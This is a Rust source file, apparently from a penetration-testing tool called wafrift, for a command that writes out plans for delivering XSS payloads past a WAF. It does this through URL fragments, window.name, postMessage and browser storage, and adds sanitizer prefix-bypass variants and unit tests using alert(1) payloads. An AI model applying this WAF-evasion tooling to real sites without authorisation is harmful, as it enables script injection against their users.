//! `wafrift client-deliver` — emit the WAF-blind **client-side** delivery plan.
//!
//! Every other delivery wafrift emits (`exploit`, `scan`, the `equiv` server
//! shapes) puts the payload on the wire *through* the WAF and confirms by a
//! server reflection. Against a modern WAF plus framework auto-escaping that
//! lane is nearly dead for XSS (1 of 895 confirmed bypasses on a live Cloudflare
//! stack).
//!
//! The XSS that pays in 2026 is **client-side / DOM**: the taint source
//! (`location.hash`, `window.name`, `postMessage`, `localStorage` /
//! `sessionStorage`, an SPA client route) frequently never reaches the server at
//! all, so no WAF or CDN can inspect it:
//!
//! ```text
//!   ?success=javascript:alert(1)   → 403  (Cloudflare inspects the query)
//!   #success=javascript:alert(1)   → 200  (the fragment is never sent)
//! ```
//!
//! This command turns wafrift's WAF-blind channel catalog
//! ([`wafrift_grammar::grammar::equiv::client_channel`]) into a concrete,
//! copy-pasteable delivery plan: for each channel, the scald-core taint source
//! it lands in and the exact browser action that delivers it. It **sends
//! nothing** — execution is confirmed in a real browser by scald (or by hand).
//! The JSON form (`wafrift.client_deliver.v1`) is the contract scald consumes at
//! the single wafrift↔scald integration boundary.

use std::process::ExitCode;

use clap::Args;

use wafrift_grammar::grammar::equiv::client_channel::{
    self, ClientChannel, DeliveryAction,
};

/// Output format for `client-deliver`.
#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq, Default)]
pub(crate) enum ClientDeliverFormat {
    /// Human-readable plan on stdout (default).
    #[default]
    Text,
    /// Machine-readable plan (schema `wafrift.client_deliver.v1`) on stdout.
    Json,
}

#[derive(Args, Debug)]
pub(crate) struct ClientDeliverArgs {
    /// Target URL the payload is delivered against. Fragment / client-route
    /// channels build a navigation URL from it; browser-state channels
    /// (window.name / storage / postMessage) seed state and then load it.
    #[arg(long)]
    pub target: String,
    /// XSS payload bytes to land in the DOM sink. Delivered VERBATIM — the
    /// fragment and browser-state channels are never WAF-inspected, so no
    /// evasion encoding is applied or needed. The default exercises the
    /// `javascript:` sanitizer-prefix-bypass lane (Paddle `substring(0,11)`
    /// class); pass a markup payload (e.g. `<img src=x onerror=alert(1)>`) for
    /// an innerHTML / document.write sink.
    #[arg(long, default_value = "javascript:alert(1)")]
    pub payload: String,
    /// Cap on the number of deliveries emitted (identity payload across every
    /// channel, plus the prefix-bypass variants for a scheme payload).
    #[arg(long, default_value_t = 32)]
    pub max: usize,
    /// Output format: `text` (default) or `json` (`wafrift.client_deliver.v1`).
    #[arg(long, value_enum, default_value_t = ClientDeliverFormat::Text)]
    pub format: ClientDeliverFormat,
}

/// One planned WAF-blind delivery: which channel, the scald taint source it
/// lands in, the concrete browser action, and a one-line operator instruction.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub(crate) struct ClientDeliveryEntry {
    /// Stable channel label (`fragment`, `window_name`, …).
    pub channel: String,
    /// scald-core `dom.rs` taint source this channel delivers through.
    pub taint_source: String,
    /// Always `false` — a client channel never reaches a server sink. Emitted
    /// explicitly so a consumer never routes confirmation to the server oracle.
    pub reaches_server: bool,
    /// Rules composed to produce this delivery (audit attribution).
    pub rules: Vec<String>,
    /// The concrete browser action that performs the delivery.
    pub action: DeliveryAction,
    /// A single-line, copy-pasteable operator instruction.
    pub instruction: String,
}

/// The full plan emitted by `client-deliver`.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub(crate) struct ClientDeliveryReport {
    /// Schema tag for downstream consumers (scald).
    pub schema: String,
    /// Target URL the plan was built against.
    pub target: String,
    /// The payload delivered (verbatim).
    pub payload: String,
    /// Number of deliveries in the plan.
    pub count: usize,
    /// The planned deliveries, in deterministic generation order.
    pub deliveries: Vec<ClientDeliveryEntry>,
}

/// Stable schema identifier for the JSON plan.
const SCHEMA: &str = "wafrift.client_deliver.v1";

/// Build the delivery plan for `target` / `payload`, capped at `max`. Pure (no
/// I/O) so it can be unit-tested directly and reused by other emitters.
#[must_use]
pub(crate) fn build_report(target: &str, payload: &str, max: usize) -> ClientDeliveryReport {
    let deliveries: Vec<ClientDeliveryEntry> = client_channel::xss_client_delivered(payload, max)
        .into_iter()
        .map(|d| entry_for(target, &d.channel, &d.payload, &d.rules))
        .collect();
    ClientDeliveryReport {
        schema: SCHEMA.to_string(),
        target: target.to_string(),
        payload: payload.to_string(),
        count: deliveries.len(),
        deliveries,
    }
}

/// Turn one channel + payload into a fully-resolved plan entry against `target`.
/// `xss_client_delivered` already produced the per-channel payload (identity or
/// prefix-bypass variant); this resolves it into the concrete browser action.
fn entry_for(
    target: &str,
    channel: &ClientChannel,
    payload: &str,
    rules: &[&'static str],
) -> ClientDeliveryEntry {
    let action = channel.delivery_action(target, payload);
    ClientDeliveryEntry {
        channel: channel.label().to_string(),
        taint_source: channel.taint_source().to_string(),
        reaches_server: channel.reaches_server(),
        rules: rules.iter().map(|r| (*r).to_string()).collect(),
        instruction: action.describe(),
        action,
    }
}

pub(crate) fn run_client_deliver(args: ClientDeliverArgs) -> ExitCode {
    if args.max == 0 {
        eprintln!("error: --max must be at least 1");
        return ExitCode::from(2);
    }
    let report = build_report(&args.target, &args.payload, args.max);

    if report.deliveries.is_empty() {
        eprintln!("error: no client deliveries generated for the given payload");
        return ExitCode::from(4);
    }

    match args.format {
        ClientDeliverFormat::Json => match serde_json::to_string_pretty(&report) {
            Ok(s) => println!("{s}"),
            Err(e) => {
                eprintln!("error: serialise plan: {e}");
                return ExitCode::from(1);
            }
        },
        ClientDeliverFormat::Text => print_human(&report),
    }
    ExitCode::SUCCESS
}

fn print_human(report: &ClientDeliveryReport) {
    println!("wafrift client-deliver — WAF-blind client-side delivery plan");
    println!("target  : {}", report.target);
    println!("payload : {}", report.payload);
    println!(
        "note    : these channels are NEVER inspected by the WAF/CDN; confirm DOM\n          \
         execution in a real browser (scald), not by a server response.\n"
    );
    println!("{} deliveries:", report.count);
    for (i, d) in report.deliveries.iter().enumerate() {
        println!(
            "  [{:>2}] {:<16} → {:<16} [{}]",
            i + 1,
            d.channel,
            d.taint_source,
            d.rules.join("+")
        );
        println!("       {}", d.instruction);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn report_covers_every_waf_blind_channel() {
        let r = build_report("https://t/checkout", "javascript:alert(1)", 40);
        for c in ClientChannel::catalog() {
            assert!(
                r.deliveries.iter().any(|d| d.channel == c.label()),
                "channel {} missing from plan",
                c.label()
            );
        }
    }

    #[test]
    fn every_delivery_is_marked_waf_blind() {
        let r = build_report("https://t/", "javascript:alert(1)", 40);
        assert!(!r.deliveries.is_empty());
        for d in &r.deliveries {
            assert!(
                !d.reaches_server,
                "delivery on {} must be flagged WAF-blind",
                d.channel
            );
        }
    }

    #[test]
    fn fragment_delivery_builds_navigation_url_against_target() {
        let r = build_report("https://t/checkout", "javascript:alert(1)", 40);
        let frag = r
            .deliveries
            .iter()
            .find(|d| d.channel == "fragment" && d.rules == vec!["identity".to_string()])
            .expect("fragment identity delivery present");
        assert_eq!(
            frag.action,
            DeliveryAction::Navigate {
                url: "https://t/checkout#javascript:alert(1)".to_string()
            }
        );
        assert_eq!(frag.taint_source, "location.hash");
    }

    #[test]
    fn scheme_payload_yields_prefix_bypass_deliveries() {
        let r = build_report("https://t/", "javascript:alert(1)", 40);
        assert!(
            r.deliveries.iter().any(|d| d.rules.contains(&"prefix_bypass".to_string())),
            "a scheme payload must produce prefix-bypass deliveries"
        );
    }

    #[test]
    fn markup_payload_has_no_prefix_bypass_deliveries() {
        let r = build_report("https://t/", "<img src=x onerror=alert(1)>", 40);
        assert!(
            !r.deliveries.iter().any(|d| d.rules.contains(&"prefix_bypass".to_string())),
            "a markup payload needs no prefix bypass (the channel is the bypass)"
        );
        // …but it still covers every channel.
        for c in ClientChannel::catalog() {
            assert!(r.deliveries.iter().any(|d| d.channel == c.label()));
        }
    }

    #[test]
    fn report_respects_max_cap() {
        let r = build_report("https://t/", "javascript:alert(1)", 3);
        assert!(r.deliveries.len() <= 3);
        assert_eq!(r.count, r.deliveries.len());
    }

    #[test]
    fn report_is_deterministic() {
        let a = build_report("https://t/x", "javascript:alert(1)", 20);
        let b = build_report("https://t/x", "javascript:alert(1)", 20);
        assert_eq!(a, b);
    }

    #[test]
    fn json_plan_round_trips_under_the_versioned_schema() {
        let r = build_report("https://t/x", "javascript:alert(1)", 20);
        let json = serde_json::to_string(&r).expect("serialise");
        assert!(json.contains("wafrift.client_deliver.v1"));
        let back: ClientDeliveryReport = serde_json::from_str(&json).expect("deserialise");
        assert_eq!(r, back);
    }

    #[test]
    fn every_instruction_mentions_the_delivered_payload() {
        // The text plan must be directly actionable: each instruction carries the
        // exact bytes (identity or prefix-variant) it delivers.
        let r = build_report("https://t/", "javascript:alert(1)", 40);
        for d in &r.deliveries {
            assert!(
                d.instruction.contains("alert(1)"),
                "instruction on {} dropped the payload: {}",
                d.channel,
                d.instruction
            );
        }
    }

    #[test]
    fn taint_sources_match_the_scald_contract() {
        let r = build_report("https://t/", "<svg onload=alert(1)>", 40);
        let by_channel = |name: &str| {
            r.deliveries
                .iter()
                .find(|d| d.channel == name)
                .map(|d| d.taint_source.clone())
                .unwrap_or_default()
        };
        assert_eq!(by_channel("fragment"), "location.hash");
        assert_eq!(by_channel("window_name"), "window.name");
        assert_eq!(by_channel("post_message"), "postMessage");
        assert_eq!(by_channel("local_storage"), "localStorage");
        assert_eq!(by_channel("session_storage"), "sessionStorage");
    }
}
